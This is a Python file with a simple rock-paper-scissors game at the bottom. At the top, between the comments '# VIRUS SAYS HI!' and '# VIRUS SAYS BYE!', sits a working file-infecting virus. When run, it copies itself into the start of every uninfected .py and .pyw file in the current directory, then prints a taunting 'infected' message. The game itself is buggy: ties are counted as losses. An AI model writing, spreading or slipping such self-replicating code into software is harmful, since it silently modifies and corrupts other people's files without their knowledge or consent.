# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

import random

user_wins=0
computer_wins=0
scissor ="scissor's"
options=["Rock","Paper","scissor"]
while True:
    user_input=input("Type Rock,Paper,scissor's or 'Q' to quit: ").lower()
    if user_input == 'q':
        print("thankyou, come again anytime!")
        break
    random_number = random.randint(0, 2)
    computer_pick = options[random_number]

    print("computr Picked ", computer_pick)
    if user_input== "rock" and computer_pick=="scissor":
        print('You win')
        user_wins += 1
    elif user_input== "paper" and computer_pick=="rock":
        print('You win')
        user_wins += 1
    elif user_input== "scissor" and computer_pick=="paper":
        print('You win')
        user_wins += 1
    else:
        print("You lost!")
        computer_wins += 1


print("you won ", user_wins,"times")
print("computer won ", computer_wins, 'times')


print('goodbye')


